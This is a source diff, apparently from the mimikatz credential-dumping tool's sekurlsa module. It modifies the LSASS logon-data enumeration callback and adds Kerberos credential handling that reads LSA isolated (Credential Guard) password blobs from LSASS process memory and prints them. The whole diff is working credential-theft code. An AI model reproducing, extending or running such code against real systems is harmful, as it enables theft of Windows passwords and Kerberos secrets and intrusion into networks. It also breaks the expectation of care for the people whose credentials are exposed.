@@ -353,18 +353,25 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LO
 {
 	PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA pLsassData = (PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA) pOptionalData;
 	ULONG i;
+	//PDWORD sub = NULL;
 	if((pData->LogonType != Network)/* && pData->LogonType != UndefinedLogonType*/)
 	{
-		kuhl_m_sekurlsa_printinfos_logonData(pData);
-		for(i = 0; i < pLsassData->nbPackages; i++)
-		{
-			if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
+		//if(IsValidSid(pData->pSid) && GetSidSubAuthorityCount(pData->pSid))
+		//	sub = GetSidSubAuthority(pData->pSid, 0);
+
+		//if(!sub || (*sub != 90 && *sub != 96))
+		//{
+			kuhl_m_sekurlsa_printinfos_logonData(pData);
+			for(i = 0; i < pLsassData->nbPackages; i++)
 			{
-				kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
-				pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData);
-				kprintf(L"\n");
+				if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
+				{
+					kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
+					pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData);
+					kprintf(L"\n");
+				}
 			}
-		}
+		//}
 	}
 	return TRUE;
 }
@@ -1020,7 +1027,8 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	PWSTR sid = NULL;
 	PBYTE msvCredentials;
 	const MSV1_0_PRIMARY_HELPER * pMSVHelper;
-	
+	PLSAISO_DATA_BLOB blob = NULL;
+
 	if(mesCreds)
 	{
 		ConvertSidToStringSid(pData->pSid, &sid);
@@ -1155,7 +1163,29 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10)
 				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL) mesCreds)->Password;
 			else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607)
-				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->Password;
+			{
+				switch(((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->type)
+				{
+				case 1:
+					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
+					mesCreds->Password.Buffer = NULL;
+					buffer.Length = buffer.MaximumLength = (USHORT) ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->IsoPassword.StructSize;
+					buffer.Buffer = (PWSTR) ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->IsoPassword.isoBlob;
+					if(kull_m_process_getUnicodeString(&buffer, cLsass.hLsassMem))
+						blob = (PLSAISO_DATA_BLOB) buffer.Buffer;
+					//break;
+				case 0:
+					// no creds
+					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
+					mesCreds->Password.Buffer = NULL;
+					break;
+				case 2:
+					mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->Password;
+					break;
+				default:
+					PRINT_ERROR(L"Unknown version in Kerberos credentials structure\n");
+				}
+			}
 			
 			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
 			{
@@ -1198,6 +1228,12 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 							kprintf(L"%wZ", password);
 					}
 					else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
+
+					if(blob)
+					{
+						kuhl_m_sekurlsa_genericLsaIsoOutput(blob);
+						LocalFree(blob);
+					}
 				}
 
 				if(username)
